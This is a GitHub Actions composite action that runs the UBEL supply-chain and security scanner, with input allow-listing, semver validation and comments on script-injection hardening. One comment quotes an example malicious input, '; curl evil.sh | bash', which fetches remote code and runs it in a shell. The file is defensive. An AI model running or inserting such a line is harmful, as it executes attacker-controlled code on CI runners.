name: 'UBEL Security Scan and dependencies firewall'
description: 'Supply-chain, secrets, SAST, and cloud misconfiguration scanning via UBEL'
inputs:
  command:
    description: 'Which UBEL bin to run: sast, mal, chunk, cicd, agent, platform, secrets, license, cloud, npm, pnpm, bun, yarn, docker, pip, pipx, uv, apt, dnf, yum'
    required: true
  version:
    description: 'Pinned @arcane-spark/ubel-node version'
    default: '0.8.0'
  args:
    description: 'Extra flags, e.g. --fail-on high'
    default: ''
runs:
  using: 'composite'
  steps:
    # Pinned by commit SHA, not the mutable `v4` tag — a tag can be
    # repointed by the upstream maintainer or, in a compromise scenario,
    # by an attacker with write access to that repo; a SHA can't.
    # SHA below corresponds to the v4.0.2 release tag.
    - uses: actions/setup-node@60edb5dd545a775178f52524783378180af0d1f # v4.0.2
      with:
        node-version: '20'

    # `command`, `version`, and `args` are step INPUTS, not hardcoded
    # values — a caller elsewhere in a workflow (or a reusable-workflow
    # chain feeding this action a computed value) could supply anything.
    # They're passed via `env:` and referenced as shell variables here
    # rather than interpolated with `${{ }}` directly into the `run:`
    # script text below. That distinction matters: `${{ }}` expansion
    # happens BEFORE bash ever sees the script, so an input containing
    # something like `; curl evil.sh | bash` would be spliced into the
    # script as literal shell syntax and executed — this is GitHub's own
    # documented "script injection" risk for composite/workflow actions
    # (see: Security hardening for GitHub Actions, "Understanding the
    # risk of script injection"). Referencing them as `$COMMAND`/`$ARGS`
    # instead means bash only ever sees them as data.
    #
    # `command` is additionally checked against an explicit allow-list kept
    # in sync with UBEL's actual registered `package.json` bin names (not
    # derived from it automatically — this list must be updated by hand
    # whenever a bin is added or removed there), so this can never
    # construct or execute a binary name that isn't one of ours regardless
    # of what a caller passes.
    #
    # `pip`/`pipx` need a `python3`/`python` interpreter on PATH to create
    # their venv — `setup-node` above doesn't provision one, so a workflow
    # using either command needs its own `actions/setup-python` step (or a
    # runner image, e.g. GitHub-hosted `ubuntu-latest`, that already has one).
    #
    # `uv` needs BOTH a `python3`/`python` interpreter (same as above, to
    # create the venv) AND the `uv` binary itself on PATH — neither is
    # provisioned by `setup-node`; use `astral-sh/setup-uv` for the latter.
    #
    # `apt`/`dnf`/`yum` are three separate commands, each bound to exactly
    # one native package manager — same one-binary-per-tool shape as
    # `npm`/`pnpm`/`bun` above, no auto-detection between them. Each only
    # works on a Linux runner that actually has that specific tool present —
    # e.g. `dnf`/`yum` are no-ops on GitHub-hosted `ubuntu-latest`, and all
    # three are no-ops on `windows-latest`/`macos-latest`. `install` mode
    # also shells out to `sudo <pkg-manager> install`, which needs
    # passwordless sudo; GitHub-hosted Ubuntu runners have this by default,
    # but a locked-down self-hosted runner may not.
    #
    # `cloud` needs credentials for whichever provider(s) it's scanning,
    # supplied as env vars on this step (this action doesn't request or
    # forward any itself) — a GitHub-hosted runner isn't on AWS/GCP/Azure,
    # so the metadata-server/managed-identity fallback each provider has
    # won't apply here:
    #   AWS:   AWS_ACCESS_KEY_ID + AWS_SECRET_ACCESS_KEY (+ AWS_SESSION_TOKEN)
    #   GCP:   GOOGLE_APPLICATION_CREDENTIALS pointing at a checked-out
    #          service-account key file (e.g. written from a secret earlier
    #          in the job — never commit the key itself)
    #   Azure: AZURE_TENANT_ID + AZURE_CLIENT_ID + AZURE_CLIENT_SECRET, plus
    #          AZURE_SUBSCRIPTION_ID (always required regardless of provider)
    - shell: bash
      env:
        UBEL_ACTION_COMMAND: ${{ inputs.command }}
        UBEL_ACTION_VERSION: ${{ inputs.version }}
        UBEL_ACTION_ARGS:    ${{ inputs.args }}
      run: |
        case "$UBEL_ACTION_COMMAND" in
          sast|mal|chunk|cicd|agent|platform|secrets|license|cloud|npm|pnpm|bun|yarn|docker|pip|pipx|uv|apt|dnf|yum)
            ;;
          *)
            echo "::error::Unknown command '$UBEL_ACTION_COMMAND' — must be one of: sast, mal, chunk, cicd, agent, platform, secrets, license, cloud, npm, pnpm, bun, yarn, docker, pip, pipx, uv, apt, dnf, yum"
            exit 1
            ;;
        esac

        if ! [[ "$UBEL_ACTION_VERSION" =~ ^[0-9]+\.[0-9]+\.[0-9]+([-.].+)?$ ]]; then
          echo "::error::version input must be a plain semver string, got '$UBEL_ACTION_VERSION'"
          exit 1
        fi

        npx -p "@arcane-spark/ubel-node@${UBEL_ACTION_VERSION}" -- ubel-${UBEL_ACTION_COMMAND} $UBEL_ACTION_ARGS